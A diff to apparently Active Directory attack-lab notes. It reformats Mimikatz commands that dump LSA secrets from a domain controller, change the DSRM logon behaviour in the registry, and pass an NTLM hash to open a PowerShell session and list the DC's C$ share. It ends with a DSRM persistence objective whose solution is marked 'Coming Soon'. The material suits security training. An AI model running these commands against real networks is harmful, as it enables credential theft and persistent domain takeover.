@@ -288,6 +288,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
 
 - First one is the DSRM local Administrator.
 
+--- 
 
 - Since it is the local administrator of the DC, we can also pass the hash to authenticate.
 - But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash.
@@ -300,8 +301,28 @@ New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminL
 
 
 - Then use the below command to pass the hash
+
+
 ```powershell
 $ Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
-ls \\dcorp-dc\C$
+
+$ ls \\dcorp-dc\C$
 ```
+
+
+
+# **Learning Objective 11**
+
+
+- During additional lab time:
+- Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.
+
+
+
+## **Solution**
+
+
+**_Coming Soon_**
+
+
 
